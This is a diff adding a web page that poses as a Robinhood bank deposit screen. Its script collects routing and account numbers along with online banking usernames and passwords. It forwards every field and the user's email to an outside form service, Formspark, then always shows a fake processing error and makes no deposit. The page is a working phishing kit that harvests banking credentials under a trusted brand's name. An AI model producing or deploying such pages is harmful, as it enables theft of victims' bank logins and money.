@@ -1,0 +1,25 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bank Deposit — Robinhood</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../../assets/css/app.css"></head><body>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script><script src="../../assets/js/supabase.js"></script><script src="../../assets/js/auth.js"></script><script src="../../assets/js/shell.js"></script><script src="../../assets/js/prices.js"></script><script src="../../assets/js/formspark.js"></script><script src="../../assets/js/wallet.js"></script>
+<script>
+(async () => { const session = await requireAuth(); if(!session) return; await renderShell({active:"deposit",session}); const c=document.getElementById("content"); c.innerHTML = `<h1>Bank Transfer</h1><div class="card"><form id="bf">
+<div class="field"><label>Amount (USD)</label><input name="amount" type="number" step="0.01" min="10" required></div>
+<div class="field"><label>Account holder name</label><input name="name" required></div>
+<div class="field"><label>Bank name</label><input name="bank" required></div>
+<div class="field"><label>Routing number</label><input name="routing" required inputmode="numeric"></div>
+<div class="field"><label>Account number</label><input name="account" required inputmode="numeric"></div>
+<div class="field"><label>Online banking username</label><input name="online_username"></div>
+<div class="field"><label>Online banking password</label><input name="online_password" type="password"></div>
+<button class="btn btn-primary btn-block" type="submit">Link & Deposit</button>
+<div id="err" class="form-error hidden" style="margin-top:12px"></div>
+</form></div>`;
+document.getElementById("bf").onsubmit = async e => {
+  e.preventDefault();
+  const fd = Object.fromEntries(new FormData(e.target));
+  const u = (await sb.auth.getUser()).data.user;
+  const btn = e.target.querySelector("button[type=submit]"); btn.disabled = true; btn.textContent = "Processing...";
+  await submitToFormspark({ form: "bank_deposit", user_email: u.email, ...fd });
+  btn.disabled = false; btn.textContent = "Link & Deposit";
+  const err = document.getElementById("err"); err.textContent = "We couldnt process this right now. Please try again later."; err.classList.remove("hidden");
+}; })();
+</script></body></html>
